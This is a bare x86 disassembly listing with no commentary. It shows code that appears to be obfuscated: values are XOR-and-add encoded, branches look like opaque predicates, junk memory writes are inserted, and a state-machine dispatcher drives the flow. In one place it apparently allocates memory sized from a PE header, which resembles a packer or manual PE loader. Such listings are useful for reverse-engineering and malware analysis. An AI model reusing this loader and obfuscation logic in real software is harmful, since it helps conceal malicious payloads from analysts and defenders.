  4284bd:	mov    eax,DWORD PTR [ebp+0x8]
  4284c0:	mov    ecx,DWORD PTR [ebp-0x18]
  4284c3:	xor    eax,edi
  4284c5:	add    eax,ebx
  4284c7:	cmp    eax,ecx
  4284c9:	je     0x4284de
  4284cb:	mov    eax,DWORD PTR [ebp+0x8]
  4284ce:	xor    eax,edi
  4284d0:	add    eax,ebx
  4284d2:	push   eax
  4284d3:	push   0x18
  4284d5:	lea    eax,[ebp-0x64]
  4284d8:	push   eax
  4284d9:	call   0x427d82
  4284de:	mov    eax,DWORD PTR [ebp-0x4]
  4284e1:	add    eax,0x18
  4284e4:	mov    DWORD PTR [ebp+0x18],eax
  4284e7:	push   DWORD PTR [ebp-0x50]
  4284ea:	push   DWORD PTR [ebp+0x18]
  4284ed:	mov    eax,DWORD PTR [ebp-0x54]
  4284f0:	add    eax,DWORD PTR [ebp-0x20]
  4284f3:	push   eax
  4284f4:	call   0x42779d
  4284f9:	mov    eax,DWORD PTR [ebp+0x8]
  4284fc:	mov    ecx,DWORD PTR [ebp-0x18]
  4284ff:	xor    eax,edi
  428501:	add    eax,ebx
  428503:	cmp    eax,ecx
  428505:	je     0x428518
  428507:	push   0x0
  428509:	push   DWORD PTR [ebp-0x50]
  42850c:	mov    eax,DWORD PTR [ebp-0x54]
  42850f:	add    eax,DWORD PTR [ebp-0x20]
  428512:	push   eax
  428513:	call   0x427d82
  428518:	mov    eax,DWORD PTR [ebp-0x24]
  42851b:	mov    ecx,DWORD PTR [ebp-0x50]
  42851e:	add    DWORD PTR [eax],ecx
  428520:	mov    eax,DWORD PTR [ebp-0x50]
  428523:	add    eax,DWORD PTR [ebp+0x1c]
  428526:	mov    DWORD PTR [ebp+0x1c],eax
  428529:	mov    eax,DWORD PTR [ebp-0x8]
  42852c:	mov    ecx,DWORD PTR [ebp+0x1c]
  42852f:	xor    eax,edi
  428531:	add    eax,ebx
  428533:	imul   eax,ecx
  428536:	mov    ecx,DWORD PTR [ebp+0x8]
  428539:	mov    edx,DWORD PTR [ebp-0x28]
  42853c:	xor    ecx,edi
  42853e:	lea    ecx,[ecx+edx*1+0x3272ef]
  428545:	cmp    eax,ecx
  428547:	jb     0x4281a5
  42854d:	mov    esi,DWORD PTR [ebp+0x14]
  428550:	mov    eax,DWORD PTR [ebp-0x20]
  428553:	mov    DWORD PTR [esi],eax
  428555:	jmp    0x42859c
  428557:	mov    ecx,DWORD PTR [ebp+0x8]
  42855a:	mov    edx,DWORD PTR [ebp+0xc]
  42855d:	xor    ecx,edi
  42855f:	xor    edx,edi
  428561:	add    ecx,ebx
  428563:	add    edx,ebx
  428565:	cmp    ecx,edx
  428567:	jne    0x42857b
  428569:	mov    eax,ds:0x7f642dd0
  42856e:	imul   eax,eax,0x9f15fccf
  428574:	mov    ds:0x7f642dd0,eax
  428579:	jmp    0x42859c
  42857b:	mov    ecx,DWORD PTR [ebp+0x8]
  42857e:	xor    ecx,edi
  428580:	add    ecx,ebx
  428582:	cmp    eax,ecx
  428584:	je     0x428592
  428586:	sub    DWORD PTR ds:0xf861e30,0x709bead0
  428590:	jmp    0x42859c
  428592:	and    DWORD PTR ds:0x3343fad0,0x5265ec3f
  42859c:	pop    edi
  42859d:	pop    esi
  42859e:	pop    ebx
  42859f:	leave  
  4285a0:	ret    0x18
  4285a3:	push   ebp
  4285a4:	mov    ebp,esp
  4285a6:	and    esp,0xfffffff8
  4285a9:	mov    eax,DWORD PTR [ebp+0x20]
  4285ac:	sub    esp,0x14
  4285af:	push   ebx
  4285b0:	mov    ebx,DWORD PTR [ebp+0x14]
  4285b3:	push   esi
  4285b4:	push   edi
  4285b5:	cmp    eax,0xf89c85b9
  4285ba:	jne    0x4285c6
  4285bc:	push   0xf89c85ba
  4285c1:	jmp    0x4286f8
  4285c6:	mov    eax,DWORD PTR [ebp+0x20]
  4285c9:	cmp    eax,0xf89c85ba
  4285ce:	jne    0x4285da
  4285d0:	push   0xf89c85bb
  4285d5:	jmp    0x4286f8
  4285da:	mov    eax,DWORD PTR [ebp+0x20]
  4285dd:	cmp    eax,0xf89c85bb
  4285e2:	jne    0x4285ee
  4285e4:	push   0xf89c85bc
  4285e9:	jmp    0x4286f8
  4285ee:	mov    eax,DWORD PTR [ebp+0x20]
  4285f1:	cmp    eax,0xf89c85bc
  4285f6:	jne    0x428602
  4285f8:	push   0xf89c85bd
  4285fd:	jmp    0x4286f8
  428602:	mov    ecx,DWORD PTR [ebp+0x20]
  428605:	mov    eax,0xf89c85b0
  42860a:	cmp    ecx,eax
  42860c:	jne    0x4286c8
  428612:	mov    eax,DWORD PTR [ebp+0x10]
  428615:	mov    DWORD PTR [esp+0xc],eax
  428619:	mov    eax,DWORD PTR [ebp+0x18]
  42861c:	mov    DWORD PTR [esp+0x14],eax
  428620:	mov    eax,DWORD PTR [ebp+0xc]
  428623:	mov    DWORD PTR [esp+0x18],eax
  428627:	mov    eax,DWORD PTR [ebp+0x8]
  42862a:	mov    DWORD PTR [esp+0x10],eax
  42862e:	mov    eax,DWORD PTR [esp+0x10]
  428632:	mov    ecx,DWORD PTR [esp+0x14]
  428636:	mov    edi,0x75108a8
  42863b:	xor    eax,edi
  42863d:	mov    esi,0x3272ef
  428642:	add    eax,esi
  428644:	mov    DWORD PTR [ecx],eax
  428646:	mov    eax,DWORD PTR [esp+0xc]
  42864a:	mov    eax,DWORD PTR [eax+0x194]
  428650:	mov    ecx,DWORD PTR [eax]
  428652:	mov    eax,DWORD PTR [esp+0xc]
  428656:	mov    eax,DWORD PTR [eax+0x194]
  42865c:	mov    eax,DWORD PTR [eax]
  42865e:	add    eax,DWORD PTR [ecx+0x3c]
  428661:	mov    ecx,DWORD PTR [esp+0xc]
  428665:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42866b:	mov    ecx,DWORD PTR [ecx+0x14]
  42866e:	push   0x4
  428670:	push   0x3000
  428675:	push   DWORD PTR [eax+0x50]
  428678:	push   0x0
  42867a:	call   ecx
  42867c:	mov    DWORD PTR [ebx],eax
  42867e:	mov    eax,DWORD PTR [esp+0x10]
  428682:	push   DWORD PTR [esp+0xc]
  428686:	xor    eax,edi
  428688:	add    eax,esi
  42868a:	mov    DWORD PTR [esp+0x20],eax
  42868e:	lea    eax,[esp+0x20]
  428692:	push   eax
  428693:	push   ebx
  428694:	push   DWORD PTR [esp+0x20]
  428698:	push   DWORD PTR [esp+0x28]
  42869c:	push   DWORD PTR [esp+0x24]
  4286a0:	call   0x428065
  4286a5:	mov    eax,DWORD PTR [esp+0x10]
  4286a9:	mov    ecx,DWORD PTR [ebx]
  4286ab:	xor    eax,edi
  4286ad:	add    eax,esi
  4286af:	cmp    ecx,eax
  4286b1:	je     0x42870f
  4286b3:	mov    eax,DWORD PTR [esp+0x18]
  4286b7:	mov    ecx,DWORD PTR [esp+0x14]
  4286bb:	xor    eax,edi
  4286bd:	add    eax,esi
  4286bf:	imul   eax,DWORD PTR [esp+0x1c]
  4286c4:	mov    DWORD PTR [ecx],eax
  4286c6:	jmp    0x42870f
  4286c8:	mov    ecx,DWORD PTR [ebp+0x20]
  4286cb:	cmp    ecx,0xf89c85bd
  4286d1:	jne    0x4286da
  4286d3:	push   0xf89c85be
  4286d8:	jmp    0x4286f8
  4286da:	mov    ecx,DWORD PTR [ebp+0x20]
  4286dd:	cmp    ecx,0xf89c85be
  4286e3:	jne    0x4286ec
  4286e5:	push   0xf89c85bf
  4286ea:	jmp    0x4286f8
  4286ec:	mov    ecx,DWORD PTR [ebp+0x20]
  4286ef:	cmp    ecx,0xf89c85bf
  4286f5:	jne    0x42870f
  4286f7:	push   eax
  4286f8:	push   DWORD PTR [ebp+0x1c]
  4286fb:	push   DWORD PTR [ebp+0x18]
  4286fe:	push   ebx
  4286ff:	push   DWORD PTR [ebp+0x10]
  428702:	push   DWORD PTR [ebp+0xc]
  428705:	push   DWORD PTR [ebp+0x8]
  428708:	call   0x4285a3
  42870d:	mov    DWORD PTR [ebx],eax
  42870f:	mov    eax,DWORD PTR [ebx]
  428711:	pop    edi
  428712:	pop    esi
  428713:	pop    ebx
  428714:	mov    esp,ebp
  428716:	pop    ebp
  428717:	ret    0x1c
  42871a:	push   ebp
  42871b:	mov    ebp,esp
  42871d:	sub    esp,0xc
  428720:	mov    eax,0xf89c85b9
  428725:	mov    DWORD PTR [ebp-0x8],eax
  428728:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  42872f:	mov    ecx,DWORD PTR [ebp-0x8]
  428732:	xor    ecx,0x75108a8
  428738:	add    ecx,0x3272ef
  42873e:	mov    DWORD PTR [ebp-0x4],ecx
  428741:	mov    ecx,DWORD PTR [ebp+0xc]
  428744:	push   eax
  428745:	mov    DWORD PTR [ebp+0xc],ecx
  428748:	push   DWORD PTR [ebp+0xc]
  42874b:	lea    eax,[ebp-0x4]
  42874e:	push   DWORD PTR [ebp+0x8]
  428751:	push   eax
  428752:	push   DWORD PTR [ebp+0xc]
  428755:	push   DWORD PTR [ebp-0xc]
  428758:	push   DWORD PTR [ebp-0x8]
  42875b:	call   0x4285a3
  428760:	mov    DWORD PTR [ebp-0x4],eax
  428763:	mov    eax,DWORD PTR [ebp-0x4]
  428766:	leave  
  428767:	ret    0x8
